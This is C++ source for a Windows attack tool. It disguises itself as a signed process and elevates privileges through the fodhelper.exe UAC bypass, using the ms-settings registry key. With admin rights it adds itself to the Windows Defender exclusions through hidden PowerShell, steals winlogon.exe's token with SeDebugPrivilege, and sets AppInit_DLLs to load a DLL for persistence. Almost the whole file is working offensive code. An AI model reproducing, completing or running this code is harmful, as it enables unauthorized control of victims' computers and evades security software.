#include "privesc.h"
#include "process_steal.h"
#include <shellapi.h>

using namespace std;

int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                     LPSTR lpCmdLine, int nCmdShow) {
  if (!IsUserAnAdmin()) {
    if (!InitNtdll()) {
      fprintf(stderr, "[-] Failed to resolve NtQueryInformationProcess.\n");
      return 1;
    }

    // Pick a random signed process to masquerade as.
    SignedProcessInfo target = PickRandomSignedProcess();
    if (target.pid == 0) {
      fprintf(stderr, "[-] No signed process found to impersonate.\n");
      return 1;
    }
    printf("[+] Selected process: %ls (PID %lu)\n\n", target.exeName.c_str(), target.pid);

    // Read info from the target.
    ProcessStrings info;
    if (!ReadRemoteProcessStrings(target.pid, info)) {
      fprintf(stderr, "[-] Failed to read process strings.\n");
      return 1;
    }

    printf("[*] Read from target process:\n");
    printf("    CommandLine   : %ls\n", info.commandLine.c_str());
    printf("    ImagePathName : %ls\n", info.imagePathName.c_str());
    printf("    WindowTitle   : %ls\n\n", info.windowTitle.c_str());
    fflush(stdout);

    // Apply to ourselves.
    ApplyToCurrentProcess(info);
  
    // Create Class "exefile" in HKCU
    // HKEY_CURRENT_USER
    //   Software
    //     Classes
    //       ms-settings
    //         Shell
    //           Open
    //             command
    //               @=current_file.exe
    //               DelegateExecute=""

    // Create registry tree
    CreateRegistryKey(HKEY_CURRENT_USER, L"Software\\Classes", L"ms-settings");
    CreateRegistryKey(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings",
                      L"Shell");
    CreateRegistryKey(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\Shell",
                      L"Open");
    CreateRegistryKey(HKEY_CURRENT_USER,
                      L"Software\\Classes\\ms-settings\\Shell\\Open", L"command");

    // Set payload
    SetRegistryValue(HKEY_CURRENT_USER,
                     L"Software\\Classes\\ms-settings\\Shell\\Open\\command", L"",
                     GetCurrentFile());
    
    // Create DelegateExecute registry value
    SetRegistryValue(HKEY_CURRENT_USER,
                     L"Software\\Classes\\ms-settings\\Shell\\Open", L"DelegateExecute",
                     L"");
    
    
    printf("[*] Writing registry keys...\n"); fflush(stdout);
    // Start fodhelper.exe with "runas" verb
    printf("[*] Launching fodhelper.exe...\n"); fflush(stdout);
    ShellExecuteW(NULL, L"open", L"C:\\Windows\\System32\\fodhelper.exe", NULL,
                  NULL, SW_SHOWNORMAL);
    Sleep(2000);
    printf("[+] Done.\n"); fflush(stdout);
  } else {
    if (IsDefenderRunning()) {
      // make window defender ignore this file at all cost
      wstring filename = GetCurrentFile();
      wstring sep = L"'";
      wstring command =
          L"Add-MpPreference -ExclusionPath " + sep + filename + sep;
      ShellExecuteW(NULL, L"runas", L"powershell.exe", command.c_str(), NULL,
                    SW_HIDE);
      // done
    }

    if (!SetPrivilege(SE_DEBUG_NAME))
      return -1;
    DWORD pid = GetPIDByName("winlogon.exe"); // TODO: find a random process everytime that match winlogon.exe permissions
    HANDLE cToken = GetToken(pid);
    LPCWSTR processes[] = {
        L"C:\\Windows\\System32\\reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows "
        L"NT\\CurrentVersion\\Windows\" /v AppInit_DLLs /t REG_EXPAND_SZ /d "
        L"C:%HOMEPATH%\\AppInit_DLLs.dll /f",
        L"C:\\Windows\\System32\\reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows "
        L"NT\\CurrentVersion\\Windows\" /v LoadAppInit_DLLs /t REG_DWORD /d 1 "
        L"/f",
    };
    int len = sizeof(processes) / sizeof(processes[0]);
    for (int i = 0; i < len; i++) {
      if (!CreateElevatedProcess(cToken, (LPWSTR)processes[i]))
        return -1;
    }
    DeleteRegistryKey(HKEY_CURRENT_USER,
                      L"Software\\Classes\\ms-settings\\Shell\\Open", L"DelegateExecute");
    DeleteRegistryKey(HKEY_CURRENT_USER,
                      L"Software\\Classes\\ms-settings\\Shell\\Open\\command", L"");
  }
  // Delete registry keys, but only from \Software\Classes\exefile\shell to not
  // interfere with other application handlers

  return 0;
}
// x86_64-w64-mingw32-g++ --static script.cpp -o main.exe
// -mwindows